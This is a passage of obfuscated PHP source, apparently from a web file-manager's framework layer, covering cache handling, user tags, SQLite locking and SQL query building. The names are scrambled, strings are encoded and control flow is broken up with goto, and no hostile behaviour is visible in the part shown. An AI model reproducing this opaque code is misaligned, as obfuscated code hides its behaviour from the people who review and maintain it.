array($CªğˆÒàÎ[445] => array($CªğˆÒàÎ[7], array_unique($E®Å´äƒº))); $A÷ŠÁãĞçâ = Model($CªğˆÒàÎ[790])->where($a¬¶£Üíµ¼)->field($CªğˆÒàÎ[394])->select(); foreach ($A÷ŠÁãĞçâ as $DîÇÙÙŞê) { Model($CªğˆÒàÎ[790])->remove($DîÇÙÙŞê[$CªğˆÒàÎ[394]], !1); } } private function storeIds() { $fŠ«ƒÑÒ© =& $_SERVER[´¬]; $EòŞ©«½ŒÊ = Model($fŠ«ƒÑÒ©[727])->listData(); $CÔ¢¾øË‹© = array(); $dîÏ›•–ÓÈ = $GLOBALS[$fŠ«ƒÑÒ©[6]][$fŠ«ƒÑÒ©[88]][$fŠ«ƒÑÒ©[791]]; foreach ($EòŞ©«½ŒÊ as $c†å¹ÆóÌ­) { $E’ï­İ†Œ = strtolower($c†å¹ÆóÌ­[$fŠ«ƒÑÒ©[94]]); if (!isset($dîÏ›•–ÓÈ[$E’ï­İ†Œ])) { continue; } $dõ‹‡Ù½‰ = $fŠ«ƒÑÒ©[72] . (isset($dîÏ›•–ÓÈ[$E’ï­İ†Œ]) ? $dîÏ›•–ÓÈ[$E’ï­İ†Œ] : ucfirst($E’ï­İ†Œ)); if (!class_exists($dõ‹‡Ù½‰)) { continue; } $CÔ¢¾øË‹©[] = $c†å¹ÆóÌ­[$fŠ«ƒÑÒ©[392]]; } return $CÔ¢¾øË‹©; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto cğ‰ÑŸÂ·; cğ‰ÑŸÂ·: $fƒ»¢Ÿã”­ =& $_SERVER[´¬]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto a¼‡“ôÅÌ´; a¼‡“ôÅÌ´: $d±»ï § = $GLOBALS[$fƒ»¢Ÿã”­[6]][$fƒ»¢Ÿã”­[346]]; $B‡éçò‡Ë = $d±»ï §[$d±»ï §[$fƒ»¢Ÿã”­[792]]]; $BÄß×„‡¥¡ = $d±»ï §[$fƒ»¢Ÿã”­[793]]; goto f«ñàšôöÅ; f«ñàšôöÅ: switch ($d±»ï §[$fƒ»¢Ÿã”­[792]]) { case $fƒ»¢Ÿã”­[17]: self::$handle = Model($fƒ»¢Ÿã”­[794]); break; case $fƒ»¢Ÿã”­[795]: self::$handle = new CacheRedis($B‡éçò‡Ë, $BÄß×„‡¥¡); break; case $fƒ»¢Ÿã”­[796]: self::$handle = new CacheMemcached($B‡éçò‡Ë, $BÄß×„‡¥¡); break; case $fƒ»¢Ÿã”­[192]: self::$handle = new CacheFile($B‡éçò‡Ë, $BÄß×„‡¥¡); break; default: break; } return self::$handle; goto A¼³…ËÛ¥±; A¼³…ËÛ¥±: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($eºÅ©Ò’Ä) { if (is_array($eºÅ©Ò’Ä) || is_object($eºÅ©Ò’Ä)) { $eºÅ©Ò’Ä = json_encode($eºÅ©Ò’Ä); } $eºÅ©Ò’Ä = rawurlencode($eºÅ©Ò’Ä); return md5(KOD_SITE_ID . $_SERVER[´¬][71] . $eºÅ©Ò’Ä); } public static function get($b«è´Óòéê, $DêĞ±Ğ‰î = false) { $Bƒºƒ¥¿Ò± = self::key($b«è´Óòéê); if ($DêĞ±Ğ‰î) { return unserialize(self::init()->get($Bƒºƒ¥¿Ò±)); } if (!isset(self::$memoryCache[$Bƒºƒ¥¿Ò±])) { $fßÖïÛˆÁ = self::init()->get($Bƒºƒ¥¿Ò±); self::$memoryCache[$Bƒºƒ¥¿Ò±] = unserialize($fßÖïÛˆÁ); } return self::$memoryCache[$Bƒºƒ¥¿Ò±]; } public static function set($AŸÈãõ‡‰, $EØÀëŞ‹¹’, $c£Ş§ÔåèŠ = false) { goto Bƒêš…Î’„; eŒ†ŸŞ¹”¿: CacheLock::lock($AŸÈãõ‡‰); $c•œ¶òÄ¼ = self::init()->set($cÌ°ª®…ÓÎ, serialize($EØÀëŞ‹¹’), $c£Ş§ÔåèŠ); self::$memoryCache[$cÌ°ª®…ÓÎ] = $EØÀëŞ‹¹’; goto bƒ¦õ—Áğ÷; Bƒêš…Î’„: $cÌ°ª®…ÓÎ = self::key($AŸÈãõ‡‰); if (isset(self::$memoryCache[$cÌ°ª®…ÓÎ]) && self::$memoryCache[$cÌ°ª®…ÓÎ] === $EØÀëŞ‹¹’) { return !0; } if ($c£Ş§ÔåèŠ === 0) { self::$memoryCache[$cÌ°ª®…ÓÎ] = $EØÀëŞ‹¹’; return !0; } goto eŒ†ŸŞ¹”¿; bƒ¦õ—Áğ÷: CacheLock::unlock($AŸÈãõ‡‰); return $c•œ¶òÄ¼; goto a…×ãÏİ; a…×ãÏİ: } public static function getCall($e¹š·Ô‘…†, $d±´¿òå³, $C‘…ËÖ«´», $c’¼Û¾ß±ó = array()) { $bÑ±àœ„Î = self::get($e¹š·Ô‘…†); if ($bÑ±àœ„Î) { return $bÑ±àœ„Î; } $bÑ±àœ„Î = call_user_func_array($C‘…ËÖ«´», $c’¼Û¾ß±ó); self::set($e¹š·Ô‘…†, $bÑ±àœ„Î, $d±´¿òå³); return $bÑ±àœ„Î; } public static function remove($a¥ˆ±ˆ”ç) { goto aŒö±á¬Ÿ; Dí§…ÔË‚‹: return $f¢Ì®‰‘„±; goto fÓ›‚…Ÿ¹; aŒö±á¬Ÿ: $f¹³šÅæò« = self::key($a¥ˆ±ˆ”ç); unset(self::$memoryCache[$f¹³šÅæò«]); self::clearTimeout(); goto báÙ›¶ŸÙù; báÙ›¶ŸÙù: CacheLock::lock($a¥ˆ±ˆ”ç); $f¢Ì®‰‘„± = self::init()->remove($f¹³šÅæò«); CacheLock::unlock($a¥ˆ±ˆ”ç); goto Dí§…ÔË‚‹; fÓ›‚…Ÿ¹: } public static function removeMemory($B†—È©ÖŒ“) { $DöÖ£íß¥¡ = self::key($B†—È©ÖŒ“); unset(self::$memoryCache[$DöÖ£íß¥¡]); } public static function clearMemory($dğÆÎ‘É‰£ = false) { if ($dğÆÎ‘É‰£) { $dğÆÎ‘É‰£ = self::key($dğÆÎ‘É‰£); unset(self::$memoryCache[$dğÆÎ‘É‰£]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[´¬][797])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[´¬][798])) { self::init()->clearTimeout(); } } } goto cô²óÒâ§’; D¼å‚Ê‡ÅÌ: class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\145\x72\x2e\164\x61\147\x4c\151\163\164"; public $modelType = "\x55\x73\145\162\117\x70\164\151\157\x6e"; public $field = array("\x6e\x61\155\145", "\x73\164\171\x6c\145", "\x73\x6f\x72\164"); public function listData($eŒÑ“ å½í = false, $eãŒÏ‘ö°ğ = "\163\x6f\x72\164", $eÄ³‹¢­ã¯ = false) { return parent::listData($eŒÑ“ å½í, $eãŒÏ‘ö°ğ, $eÄ³‹¢­ã¯); } public function remove($c‚•Í‡ëĞ ) { return parent::remove($c‚•Í‡ëĞ ); } public function add($EšíÃÕ…¹Á, $f¬–èòéŒ‚ = "\154\x61\142\145\154\55\147\162\145\171\55\x6e\x6f\x72\155\141\154") { $FÂ¢İª”‡î =& $_SERVER[´¬]; if ($this->findByName($EšíÃÕ…¹Á)) { return !1; } $F¹Ä“ŒÂÅ… = array($FÂ¢İª”‡î[411] => $EšíÃÕ…¹Á, $FÂ¢İª”‡î[462] => $f¬–èòéŒ‚, $FÂ¢İª”‡î[1693] => $this->getSort($FÂ¢İª”‡î[255]) + 1); return parent::insert($F¹Ä“ŒÂÅ…); } public function update($dåŞ³™ÍÈµ, $a‰¦á‰æÍ•) { $E…ğ£†¥° =& $_SERVER[´¬]; $B¢¢†Ğ’£ = $this->listData($dåŞ³™ÍÈµ); $f›õéæÙ‘Ó = $this->findByName($a‰¦á‰æÍ•[$E…ğ£†¥°[28]]); if (!$B¢¢†Ğ’£ || $f›õéæÙ‘Ó && $f›õéæÙ‘Ó[$E…ğ£†¥°[392]] != $B¢¢†Ğ’£[$E…ğ£†¥°[392]]) { return !1; } return parent::update($dåŞ³™ÍÈµ, $a‰¦á‰æÍ•); } public function moveTop($eŞ ˆ°—¦¸) { $F¦óÇå«„È =& $_SERVER[´¬]; $a²Û†±‚¡Á = parent::listData(); $AÖÇÓµìÀ÷ = $this->getSort($F¦óÇå«„È[254]); foreach ($a²Û†±‚¡Á as &$c±õÜÈ¥°) { if ($c±õÜÈ¥°[$F¦óÇå«„È[392]] == $eŞ ˆ°—¦¸) { $c±õÜÈ¥°[$F¦óÇå«„È[1712]] = $AÖÇÓµìÀ÷; continue; } $c±õÜÈ¥°[$F¦óÇå«„È[1712]] += 1; } unset($c±õÜÈ¥°); return parent::resetData($a²Û†±‚¡Á); } public function moveBottom($Eâ¨´”ÂÒÑ) { $EòÅãÀ°¦ñ =& $_SERVER[´¬]; $DÂ·ğÜ¹ì = $this->getSort($EòÅãÀ°¦ñ[255]) + 1; return parent::update($Eâ¨´”ÂÒÑ, array($EòÅãÀ°¦ñ[1712] => $DÂ·ğÜ¹ì)); } public function resetSort($Dë©Ó¼¿¹) { goto a‘ÉªÏëø; bÄ¤Ä›Øò: for ($eøØŠÕšºÙ = 0; $eøØŠÕšºÙ < count($Dë©Ó¼¿¹); $eøØŠÕšºÙ++) { $D¹»ßÛë„½[$Dë©Ó¼¿¹[$eøØŠÕšºÙ] . $føŒß×èí•[33]] = $eøØŠÕšºÙ + 1; } $Dß­£ô™Öƒ = parent::listData(); foreach ($Dß­£ô™Öƒ as &$E—¨è† ˆÀ) { $FçÖÖ» ëé = $D¹»ßÛë„½[$E—¨è† ˆÀ[$føŒß×èí•[392]]]; $E—¨è† ˆÀ[$føŒß×èí•[1712]] = $FçÖÖ» ëé ? $FçÖÖ» ëé : $E—¨è† ˆÀ[$føŒß×èí•[1712]]; } goto aºôöºÉÓ; aºôöºÉÓ: unset($E—¨è† ˆÀ); return parent::resetData($Dß­£ô™Öƒ); goto c·ŸÕ·´ˆº; a‘ÉªÏëø: $føŒß×èí• =& $_SERVER[´¬]; $D¹»ßÛë„½ = array(); $Dë©Ó¼¿¹ = is_array($Dë©Ó¼¿¹) ? $Dë©Ó¼¿¹ : array(); goto bÄ¤Ä›Øò; c·ŸÕ·´ˆº: } private function getSort($DÖÙáà¾Ì¥) { $eê‡¬ÑÙ©Œ =& $_SERVER[´¬]; $d™ÑÔøŠÌ = parent::listData(); $DêØÌ¬ËÔÕ = array_to_keyvalue($d™ÑÔøŠÌ, $eê‡¬ÑÙ©Œ[33], $eê‡¬ÑÙ©Œ[1712]); if (!$DêØÌ¬ËÔÕ) { $DêØÌ¬ËÔÕ = array(0); } $fÆ™‰ƒ¦ò¥ = $DÖÙáà¾Ì¥ == $eê‡¬ÑÙ©Œ[255] ? max($DêØÌ¬ËÔÕ) : min($DêØÌ¬ËÔÕ); return intval($fÆ™‰ƒ¦ò¥); } } goto F¯òÃ´•›ì; FÇÔğ×„İß: class DbSqlite3 extends DbSqlite3Base { public function query($C÷‹Ì°¦õ) { $C å„¹ Ê¬ =& $_SERVER[´¬]; if (!CacheLock::fileLock($C å„¹ Ê¬[9])) { return !1; } $BÕ—í‡“ä´ = parent::query($C÷‹Ì°¦õ); CacheLock::fileUnLock($C å„¹ Ê¬[9]); return $BÕ—í‡“ä´; } public function execute($d©ÖÉ°•¶ö) { $açÂÉßà”° =& $_SERVER[´¬]; if (!CacheLock::fileLock($açÂÉßà”°[9])) { return !1; } $cêŸÅ²ğºí = parent::execute($d©ÖÉ°•¶ö); CacheLock::fileUnLock($açÂÉßà”°[9]); return $cêŸÅ²ğºí; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\150\151\x6e\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\x3d", "\156\145\161" => "\x3c\76", "\x67\164" => "\x3e", "\145\147\164" => "\76\75", "\x6c\164" => "\x3c", "\x65\154\164" => "\x3c\x3d", "\x6e\x6f\164\154\151\153\x65" => "\x4e\x4f\x54\40\114\x49\113\x45", "\x6c\151\153\x65" => "\114\111\x4b\x45", "\x69\x6e" => "\111\x4e", "\x6e\x6f\164\151\x6e" => "\116\x4f\124\40\x49\116", "\x6e\x6f\x74\x20\x69\x6e" => "\116\117\124\40\111\x4e", "\142\145\164\167\145\x65\x6e" => "\x42\x45\x54\127\105\x45\x4e", "\156\x6f\164\142\x65\164\167\x65\x65\x6e" => "\x4e\x4f\124\40\x42\105\124\127\x45\105\x4e", "\156\157\164\40\x62\x65\x74\167\145\145\156" => "\116\x4f\x54\x20\x42\x45\124\x57\x45\105\116"); protected $selectSql = "\x53\x45\114\x45\103\x54\45\104\111\x53\124\x49\x4e\x43\x54\x25\40\45\106\x49\x45\114\104\x25\x20\106\122\x4f\x4d\x20\45\x54\x41\102\x4c\x45\x25\45\112\117\111\116\x25\45\x57\110\x45\x52\105\45\45\x47\122\x4f\x55\x50\x25\x25\110\101\x56\x49\116\107\45\x25\117\122\x44\105\x52\45\x25\114\111\115\111\x54\x25\x20\x25\125\x4e\x49\x4f\116\45\x25\x43\117\115\115\x45\x4e\124\x25"; protected $bind = array(); public static function getInstance() { $A«»Ö½¥ÂÔ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[´¬][920], $A«»Ö½¥ÂÔ); } public function factory($E§»ÙÆ¬Í‹ = '') { goto D™Şª†°; D×†ñŒ…Ã: return $dÀ®ù…ŸÄš; goto AœŠ¨Úî¥; D™Şª†°: $DİÓ¨ì»ç’ =& $_SERVER[´¬]; $E§»ÙÆ¬Í‹ = $this->parseConfig($E§»ÙÆ¬Í‹); if (empty($E§»ÙÆ¬Í‹[$DİÓ¨ì»ç’[921]])) { think_exception(think_lang($DİÓ¨ì»ç’[922])); } goto F·…Ôƒƒ˜; F·…Ôƒƒ˜: $this->dbType = ucwords(strtolower($E§»ÙÆ¬Í‹[$DİÓ¨ì»ç’[921]])); $e­ŒÖ¤º“Õ = $DİÓ¨ì»ç’[923] . $this->dbType; if (class_exists($e­ŒÖ¤º“Õ)) { $dÀ®ù…ŸÄš = new $e­ŒÖ¤º“Õ($E§»ÙÆ¬Í‹); if ($DİÓ¨ì»ç’[755] != strtolower($E§»ÙÆ¬Í‹[$DİÓ¨ì»ç’[921]])) { $dÀ®ù…ŸÄš->dbType = strtoupper($this->dbType); } else { $dÀ®ù…ŸÄš->dbType = $this->_getDsnType($E§»ÙÆ¬Í‹[$DİÓ¨ì»ç’[876]]); } } else { think_exception(think_lang($DİÓ¨ì»ç’[924]) . $DİÓ¨ì»ç’[925] . $e­ŒÖ¤º“Õ); } goto D×†ñŒ…Ã; AœŠ¨Úî¥: } public function __call($a·‹¼Ê‹¦Ã, $a‹çßÊó¤·) { if (method_exists($this, $a·‹¼Ê‹¦Ã)) { return call_user_func_array(array($this, $a·‹¼Ê‹¦Ã), $a‹çßÊó¤·); } } protected function _getDsnType($dŒïì¥Ûßä) { $dÖÏëã­Ç‰ = explode($_SERVER[´¬][4], $dŒïì¥Ûßä); $d¤îÕŠ¾ÙŸ = strtoupper(trim($dÖÏëã­Ç‰[0])); return $d¤îÕŠ¾ÙŸ; } private function parseConfig($b“ƒÑª³ = '') { $Eƒº­ÀË¸ =& $_SERVER[´¬]; if (!empty($b“ƒÑª³) && is_string($b“ƒÑª³)) { $b“ƒÑª³ = $this->parseDSN($b“ƒÑª³); } elseif (is_array($b“ƒÑª³)) { $b“ƒÑª³ = array_change_key_case($b“ƒÑª³); $b“ƒÑª³ = array($Eƒº­ÀË¸[921] => $b“ƒÑª³[$Eƒº­ÀË¸[754]], $Eƒº­ÀË¸[849] => $b“ƒÑª³[$Eƒº­ÀË¸[926]], $Eƒº­ÀË¸[850] => $b“ƒÑª³[$Eƒº­ÀË¸[927]], $Eƒº­ÀË¸[847] => $b“ƒÑª³[$Eƒº­ÀË¸[928]], $Eƒº­ÀË¸[848] => $b“ƒÑª³[$Eƒº­ÀË¸[929]], $Eƒº­ÀË¸[17] => $b“ƒÑª³[$Eƒº­ÀË¸[930]], $Eƒº­ÀË¸[876] => $b“ƒÑª³[$Eƒº­ÀË¸[756]], $Eƒº­ÀË¸[13] => isset($b“ƒÑª³[$Eƒº­ÀË¸[931]]) ? $b“ƒÑª³[$Eƒº­ÀË¸[931]] : array()); } elseif (empty($b“ƒÑª³)) { if (think_config($Eƒº­ÀË¸[932]) && $Eƒº­ÀË¸[755] != strtolower(think_config($Eƒº­ÀË¸[933]))) { $b“ƒÑª³ = $this->parseDSN(think_config($Eƒº­ÀË¸[932])); } else { $b“ƒÑª³ = array($Eƒº­ÀË¸[921] => think_config($Eƒº­ÀË¸[933]), $Eƒº­ÀË¸[849] => think_config($Eƒº­ÀË¸[934]), $Eƒº­ÀË¸[850] => think_config($Eƒº­ÀË¸[935]), $Eƒº­ÀË¸[847] => think_config($Eƒº­ÀË¸[936]), $Eƒº­ÀË¸[848] => think_config($Eƒº­ÀË¸[937]), $Eƒº­ÀË¸[17] => think_config($Eƒº­ÀË¸[243]), $Eƒº­ÀË¸[876] => think_config($Eƒº­ÀË¸[932]), $Eƒº­ÀË¸[13] => think_config($Eƒº­ÀË¸[938])); } } return $b“ƒÑª³; } protected function initConnect($Dğ¾ñÎ’æÙ = true) { if (1 == think_config($_SERVER[´¬][18])) { $this->_linkID = $this->multiConnect($Dğ¾ñÎ’æÙ); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $AØôª—‡¡ => $eÔ™ÒİÌ…Ï) { $this->_linkID = $eÔ™ÒİÌ…Ï; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($A¡ŒÄ‰­‚Í = false) { goto D»ì„‡•´ó; dÏÊÓóï³Ú: $dàƒÂÏ³™© = array($F‰˜¿İÖæÖ[849] => isset($A ¨î†¯Ê“[$F‰˜¿İÖæÖ[849]][$dò¼ „«Õ²]) ? $A ¨î†¯Ê“[$F‰˜¿İÖæÖ[849]][$dò¼ „«Õ²] : $A ¨î†¯Ê“[$F‰˜¿İÖæÖ[849]][0], $F‰˜¿İÖæÖ[850] => isset($A ¨î†¯Ê“[$F‰˜¿İÖæÖ[850]][$dò¼ „«Õ²]) ? $A ¨î†¯Ê“[$F‰˜¿İÖæÖ[850]][$dò¼ „«Õ²] : $A ¨î†¯Ê“[$F‰˜¿İÖæÖ[850]][0], $F‰˜¿İÖæÖ[847] => isset($A ¨î†¯Ê“[$F‰˜¿İÖæÖ[847]][$dò¼ „«Õ²]) ? $A ¨î†¯Ê“[$F‰˜¿İÖæÖ[847]][$dò¼ „«Õ²] : $A ¨î†¯Ê“[$F‰˜¿İÖæÖ[847]][0], $F‰˜¿İÖæÖ[848] => isset($A ¨î†¯Ê“[$F‰˜¿İÖæÖ[848]][$dò¼ „«Õ²]) ? $A ¨î†¯Ê“[$F‰˜¿İÖæÖ[848]][$dò¼ „«Õ²] : $A ¨î†¯Ê“[$F‰˜¿İÖæÖ[848]][0], $F‰˜¿İÖæÖ[17] => isset($A ¨î†¯Ê“[$F‰˜¿İÖæÖ[17]][$dò¼ „«Õ²]) ? $A ¨î†¯Ê“[$F‰˜¿İÖæÖ[17]][$dò¼ „«Õ²] : $A ¨î†¯Ê“[$F‰˜¿İÖæÖ[17]][0], $F‰˜¿İÖæÖ[876] => isset($A ¨î†¯Ê“[$F‰˜¿İÖæÖ[876]][$dò¼ „«Õ²]) ? $A ¨î†¯Ê“[$F‰˜¿İÖæÖ[876]][$dò¼ „«Õ²] : $A ¨î†¯Ê“[$F‰˜¿İÖæÖ[876]][0], $F‰˜¿İÖæÖ[13] => isset($A ¨î†¯Ê“[$F‰˜¿İÖæÖ[13]][$dò¼ „«Õ²]) ? $A ¨î†¯Ê“[$F‰˜¿İÖæÖ[13]][$dò¼ „«Õ²] : $A ¨î†¯Ê“[$F‰˜¿İÖæÖ[13]][0]); return $this->connect($dàƒÂÏ³™©, $dò¼ „«Õ²); goto E©Îİ Ô; Fƒ˜‹ƒƒ¶: if (empty($A ¨î†¯Ê“)) { foreach ($this->config as $FàµÎ›ôè => $A½»îéÌáù) { $A ¨î†¯Ê“[$FàµÎ›ôè] = explode($F‰˜¿İÖæÖ[47], $A½»îéÌáù); } } if (think_config($F‰˜¿İÖæÖ[939])) { if ($A¡ŒÄ‰­‚Í) { $dò¼ „«Õ² = floor(mt_rand(0, think_config($F‰˜¿İÖæÖ[940]) - 1)); $CîŞ£øç¥ù = $dò¼ „«Õ²; } else { if (is_numeric(think_config($F‰˜¿İÖæÖ[941]))) { $dò¼ „«Õ² = think_config($F‰˜¿İÖæÖ[941]); } else { $dò¼ „«Õ² = floor(mt_rand(think_config($F‰˜¿İÖæÖ[940]), count($A ¨î†¯Ê“[$F‰˜¿İÖæÖ[847]]) - 1)); } } } else { $dò¼ „«Õ² = floor(mt_rand(0, count($A ¨î†¯Ê“[$F‰˜¿İÖæÖ[847]]) - 1)); $CîŞ£øç¥ù = $dò¼ „«Õ²; } $dò¼ „«Õ² = $CîŞ£øç¥ù !== -1 ? $CîŞ£øç¥ù : $dò¼ „«Õ²; goto dÏÊÓóï³Ú; D»ì„‡•´ó: $F‰˜¿İÖæÖ =& $_SERVER[´¬]; static $A ¨î†¯Ê“ = array(); static $CîŞ£øç¥ù = -1; goto Fƒ˜‹ƒƒ¶; E©Îİ Ô: } public function parseDSN($FÜí¸”î‰„) { $cõÌĞ•Ó¯¸ =& $_SERVER[´¬]; if (empty($FÜí¸”î‰„)) { return !1; } $DÏ‹²††¸ = parse_url($FÜí¸”î‰„); if ($DÏ‹²††¸[$cõÌĞ•Ó¯¸[174]]) { $CàÛò‘š¨Ñ = array($cõÌĞ•Ó¯¸[921] => $DÏ‹²††¸[$cõÌĞ•Ó¯¸[174]], $cõÌĞ•Ó¯¸[849] => isset($DÏ‹²††¸[$cõÌĞ•Ó¯¸[561]]) ? $DÏ‹²††¸[$cõÌĞ•Ó¯¸[561]] : $cõÌĞ•Ó¯¸[33], $cõÌĞ•Ó¯¸[850] => isset($DÏ‹²††¸[$cõÌĞ•Ó¯¸[942]]) ? $DÏ‹²††¸[$cõÌĞ•Ó¯¸[942]] : $cõÌĞ•Ó¯¸[33], $cõÌĞ•Ó¯¸[847] => isset($DÏ‹²††¸[$cõÌĞ•Ó¯¸[175]]) ? $DÏ‹²††¸[$cõÌĞ•Ó¯¸[175]] : $cõÌĞ•Ó¯¸[33], $cõÌĞ•Ó¯¸[848] => isset($DÏ‹²††¸[$cõÌĞ•Ó¯¸[176]]) ? $DÏ‹²††¸[$cõÌĞ•Ó¯¸[176]] : $cõÌĞ•Ó¯¸[33], $cõÌĞ•Ó¯¸[17] => isset($DÏ‹²††¸[$cõÌĞ•Ó¯¸[76]]) ? substr($DÏ‹²††¸[$cõÌĞ•Ó¯¸[76]], 1) : $cõÌĞ•Ó¯¸[33]); } else { preg_match($cõÌĞ•Ó¯¸[943], trim($FÜí¸”î‰„), $A¥ç”¶ÊÖ); $CàÛò‘š¨Ñ = array($cõÌĞ•Ó¯¸[921] => $A¥ç”¶ÊÖ[1], $cõÌĞ•Ó¯¸[849] => $A¥ç”¶ÊÖ[2], $cõÌĞ•Ó¯¸[850] => $A¥ç”¶ÊÖ[3], $cõÌĞ•Ó¯¸[847] => $A¥ç”¶ÊÖ[4], $cõÌĞ•Ó¯¸[848] => $A¥ç”¶ÊÖ[5], $cõÌĞ•Ó¯¸[17] => $A¥ç”¶ÊÖ[6]); } $CàÛò‘š¨Ñ[$cõÌĞ•Ó¯¸[876]] = $cõÌĞ•Ó¯¸[33]; return $CàÛò‘š¨Ñ; } protected function debug() { $F×åñ‘ÉÅ =& $_SERVER[´¬]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $F×åñ‘ÉÅ[944]; if (think_config($F×åñ‘ÉÅ[945])) { think_status($F×åñ‘ÉÅ[946]); think_trace($this->queryStr . $F×åñ‘ÉÅ[947] . think_status($F×åñ‘ÉÅ[20], $F×åñ‘ÉÅ[946], 6) . $F×åñ‘ÉÅ[948], $F×åñ‘ÉÅ[33], $F×åñ‘ÉÅ[949]); } } protected function parseLock($Dº‚ÎÖ„½ğ = false) { $E¢›ÉÕËªñ =& $_SERVER[´¬]; if (!$Dº‚ÎÖ„½ğ) { return $E¢›ÉÕËªñ[33]; } if ($E¢›ÉÕËªñ[878] == $this->dbType) { return $E¢›ÉÕËªñ[950]; } return $E¢›ÉÕËªñ[951]; } protected function parseSet($a°™ÍêÛ’) { $DÓÚßáÉĞé =& $_SERVER[´¬]; foreach ($a°™ÍêÛ’ as $A­¸™¡ å³ => $aˆãÎ‘¾¦²) { if (is_array($aˆãÎ‘¾¦²) && $DÓÚßáÉĞé[294] == $aˆãÎ‘¾¦²[0]) { $B‰£©¬‡  [] = $this->parseKey($A­¸™¡ å³) . $DÓÚßáÉĞé[952] . $aˆãÎ‘¾¦²[1]; } elseif (is_scalar($aˆãÎ‘¾¦²) || is_null($aˆãÎ‘¾¦²)) { $B‰£©¬‡  [] = $this->parseKey($A­¸™¡ å³) . $DÓÚßáÉĞé[952] . $this->parseValue($aˆãÎ‘¾¦²); } } return $DÓÚßáÉĞé[953] . implode($DÓÚßáÉĞé[47], $B‰£©¬‡  ); } protected function bindParam($b¤äŠ»ñœÈ, $fÛ°èÇÛº·) { $this->bind[$_SERVER[´¬][4] . $b¤äŠ»ñœÈ] = $fÛ°èÇÛº·; } protected function parseBind($eâ„çÓ•˜Ü) { $eâ„çÓ•˜Ü = array_merge($this->bind, $eâ„çÓ•˜Ü); $this->bind = array(); return $eâ„çÓ•˜Ü; } function parseKey(&$e×ñÑèÓ¶›, $bíÒğî­ÑÍ = true) { if ($bíÒğî­ÑÍ) { $e×ñÑèÓ¶› = $this->parseKeyCheck($e×ñÑèÓ¶›); } return $e×ñÑèÓ¶›; } function parseKeyCheck($D‘ó¿ôŠ) { $B¥‘•«Ù‚Ò =& $_SERVER[´¬]; $D‘ó¿ôŠ = trim($D‘ó¿ôŠ); if (!preg_match($B¥‘•«Ù‚Ò[954], $D‘ó¿ôŠ)) { think_exception($B¥‘•«Ù‚Ò[955] . $D‘ó¿ôŠ); } return $D‘ó¿ôŠ; } protected function parseValue($eæ±«Áà) { $b¼°…é¼á– =& $_SERVER[´¬]; if (is_string($eæ±«Áà)) { $eæ±«Áà = $b¼°…é¼á–[917] . $this->escapeString($eæ±«Áà) . $b¼°…é¼á–[917]; } elseif (isset($eæ±«Áà[0]) && is_string($eæ±«Áà[0]) && strtolower($eæ±«Áà[0]) == $b¼°…é¼á–[294]) { $eæ±«Áà = $this->escapeString($eæ±«Áà[1]); } elseif (is_array($eæ±«Áà)) { $eæ±«Áà = array_map(array($this, $b¼°…é¼á–[918]), $eæ±«Áà); } elseif (is_bool($eæ±«Áà)) { $eæ±«Áà = $eæ±«Áà ? $b¼°…é¼á–[87] : $b¼°…é¼á–[495]; } elseif (is_null($eæ±«Áà)) { $eæ±«Áà = $b¼°…é¼á–[103]; } return $eæ±«Áà; } protected function parseField($d—õ…çÆ¬Â) { $CÊåìˆâµ¡ =& $_SERVER[´¬]; if (is_string($d—õ…çÆ¬Â) && strpos($d—õ…çÆ¬Â, $CÊåìˆâµ¡[47])) { $d—õ…çÆ¬Â = explode($CÊåìˆâµ¡[47], $d—õ…çÆ¬Â); } if (is_array($d—õ…çÆ¬Â)) { $cøÏõ¸’³­ = array(); foreach ($d—õ…çÆ¬Â as $bÛóµæÖÄ => $b ¾ÎîØä) { if (!is_numeric($bÛóµæÖÄ)) { $cøÏõ¸’³­[] = $this->parseKey($bÛóµæÖÄ, !1) . $CÊåìˆâµ¡[956] . $this->parseKey($b ¾ÎîØä); } else { $cøÏõ¸’³­[] = $this->parseKey($b ¾ÎîØä); } } $eÛ±µ†ÄóÃ = implode($CÊåìˆâµ¡[47], $cøÏõ¸’³­); } elseif (is_string($d—õ…çÆ¬Â) && !empty($d—õ…çÆ¬Â)) { $eÛ±µ†ÄóÃ = $d—õ…çÆ¬Â; } else { $eÛ±µ†ÄóÃ = $CÊåìˆâµ¡[182]; } return $eÛ±µ†ÄóÃ; } protected function parseTable($d‘Ì†ôĞçğ) { $c›î¢¾‡ó =& $_SERVER[´¬]; if (is_array($d‘Ì†ôĞçğ)) { $C”“Ù°Ç†ï = array(); foreach ($d‘Ì†ôĞçğ as $a¤ã›É–—ñ => $DÈ›„ŒÄõÃ) { if (!is_numeric($a¤ã›É–—ñ)) { $C”“Ù°Ç†ï[] = $this->parseKey($a¤ã›É–—ñ) . $c›î¢¾‡ó[50] . $this->parseKey($DÈ›„ŒÄõÃ); } else { $C”“Ù°Ç†ï[] = $this->parseKey($a¤ã›É–—ñ); } } $d‘Ì†ôĞçğ = $C”“Ù°Ç†ï; } elseif (is_string($d‘Ì†ôĞçğ)) { if (strstr($d‘Ì†ôĞçğ, $c›î¢¾‡ó[50])) { return $d‘Ì†ôĞçğ; } $d‘Ì†ôĞçğ = explode($c›î¢¾‡ó[47], $d‘Ì†ôĞçğ); array_walk($d‘Ì†ôĞçğ, array($this, $c›î¢¾‡ó[867])); } return $c›î¢¾‡ó[861] . trim(implode($c›î¢¾‡ó[957], $d‘Ì†ôĞçğ), $c›î¢¾‡ó[381]) . 